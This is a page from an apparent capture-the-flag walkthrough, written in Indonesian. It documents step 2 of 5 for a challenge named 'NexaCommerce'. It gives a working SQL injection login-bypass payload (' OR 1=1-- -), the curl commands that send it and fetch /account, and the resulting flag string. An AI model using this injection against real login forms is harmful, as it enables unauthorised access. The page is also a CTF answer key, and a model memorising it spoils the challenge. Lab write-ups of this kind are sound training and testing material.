# NexaCommerce — Cara mendapatkan flag

[← Overview](67-nexacommerce.md) · [Index](index.md)

> **Langkah 2/5.** Login bypass `' OR 1=1-- -`. Flag ada di halaman `/account`.
>
> **Berikutnya:** [Flag](67-nexacommerce-03-flag.md)

```bash
curl -sS -i -c cookies -H 'ngrok-skip-browser-warning: 1' \
  -d "email=' OR 1=1-- -&password=x" \
  "$HOST/login"
```

Response: `302` ke `/account` dan `Set-Cookie: session=...`.

```bash
curl -sS -b cookies -H 'ngrok-skip-browser-warning: 1' "$HOST/account" | grep -i flag
```

```text
flag for the audit console: NFX{sql1_un10n_bas3d_4uth_byp4ss}
```

Nama flag menyebut UNION, tetapi payload yang diterima server adalah `' OR 1=1-- -`. Jangan menggantinya dengan UNION kalau bypass ini sudah cukup.

### Evidence langkah ini

![00b-terminal-evidence.png](assets/nexacommerce/00b-terminal-evidence.png)

*Terminal evidence (arsip/log asli) — `00b-terminal-evidence.png`.*

**Berkas mentah terkait:**

- [`01-solve.txt`](assets/nexacommerce/01-solve.txt)
